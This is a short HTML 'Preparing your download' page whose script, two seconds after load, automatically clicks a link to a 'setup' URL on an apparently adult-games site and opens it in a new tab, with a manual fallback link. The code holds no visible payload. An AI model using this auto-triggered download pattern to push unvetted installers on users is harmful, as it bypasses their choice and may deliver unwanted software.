<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Preparing Download</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: 'Segoe UI', sans-serif;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: linear-gradient(-45deg, #1d2b64, #f8cdda, #1e3c72, #2a5298);
      background-size: 400% 400%;
      animation: gradientBG 15s ease infinite;
      color: #fff;
    }

    @keyframes gradientBG {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    .info-card {
      background-color: rgba(0, 0, 0, 0.75);
      padding: 30px 25px;
      border-radius: 14px;
      text-align: center;
      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
      width: 90%;
      max-width: 420px;
    }

    .info-icon {
      font-size: 48px;
      margin-bottom: 20px;
    }

    h1 {
      font-size: 22px;
      margin-bottom: 12px;
    }

    #status-text {
      font-size: 16px;
      color: #ddd;
    }

    .error-message {
      color: #ff4c4c;
      margin-top: 10px;
      font-size: 14px;
    }

    a.manual-link {
      color: #00e5ff;
      display: block;
      margin-top: 20px;
      font-size: 16px;
      text-decoration: underline;
    }
  </style>
</head>
<body>

  <div class="info-card">
    <div class="info-icon">⏬</div>
    <h1>Preparing your download…</h1>
    <p id="status-text">Fetching download link…</p>
    <p id="error-text" class="error-message"></p>
    <a href="https://lewdgamespc.com/setup-ali/" class="manual-link" style="display:none;" id="manualLink">Click here if it doesn't start automatically</a>
  </div>

  <script>
    const downloadUrl = "https://lewdgamespc.com/setup-ali/";

    function startDownload() {
      try {
        const link = document.createElement("a");
        link.href = downloadUrl;
        link.target = "_blank"; // open in new tab
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);

        document.getElementById("status-text").innerText = "Your download should begin shortly.";
        document.getElementById("manualLink").style.display = "block";
      } catch (error) {
        document.getElementById("status-text").innerText = "";
        document.getElementById("error-text").innerText = "Failed to start download. Please use the manual link below.";
        document.getElementById("manualLink").style.display = "block";
      }
    }

    window.onload = () => {
      setTimeout(startDownload, 2000); // 2-second delay
    };
  </script>

</body>
</html>
